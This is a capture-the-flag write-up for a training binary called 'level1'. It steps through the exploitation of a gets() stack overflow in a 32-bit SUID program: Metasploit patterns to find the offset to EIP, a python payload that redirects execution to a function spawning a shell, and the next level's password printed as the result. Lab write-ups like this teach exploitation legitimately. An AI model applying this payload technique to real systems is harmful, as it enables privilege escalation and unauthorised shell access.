- We have a 32 bit ELF binary called level1 with SUID bit set, let's decompile de code:

```bash
int32_t run()
{
	fwrite(buf: "Good... Wait what?\n", size: 1, count: 0x13, fp: stdout)
	return system(line: "/bin/sh")
}

int32_t main(int32_t argc, char** argv, char** envp)
{
    void buf
    return gets(&buf)
}
```

- The main function gets input user without any limits. We could write data until the EIP register who is responsible for pointing to the next instruction. But what if we set the next instruction as the address of the run() function that spawn a shell ?
- Lets try to find the address of run() and the offset until EIP.

```bash
- Address:
> objdump -D level1 | grep -n3 run
8048442:	c3                   	ret    
8048443:	90                   	nop

08048444 <run>:
8048444:	55                   	push   %ebp
8048445:	89 e5                	mov    %esp,%ebp
8048447:	83 ec 18             	sub    $0x18,%esp

The address of run() is 0x08048444.



- Offset until EIP (gdb peda & msf_pattern):
> cd /opt/metasploit-framework/embedded/framework/tools/exploit/
> pattern_create.rb -l 100 (Create a 100 characters "random" string)
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

> gdb ./level1
> b main
> b gets
> run
-> continue until gets()
> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Here we get a Segfault, it means we tried to write on some memory we can't write. We can see with gdb that EIP has beem wrote by some of the character we created. We can use the next msf tool to know exactly the offset until EIP.
> ./pattern_offset.rb -q c5Ac
[*] Exact match at offset 76

So after writing 76 characters on the stack, the next ones will be written on EIP, let's just write the address of run() (In little endian)

> python -c 'print "A"*76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)

- We see that the run() function has been executed but no shell spawned, that's because pipe does not support interactive shell we need to use a little trick to bypass this problem.

> (python -c 'print "A"*76 + "\x44\x84\x04\x08"' ; cat) | ./level1
Good... Wait what?
> whoami
level2
> cat ../level2
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```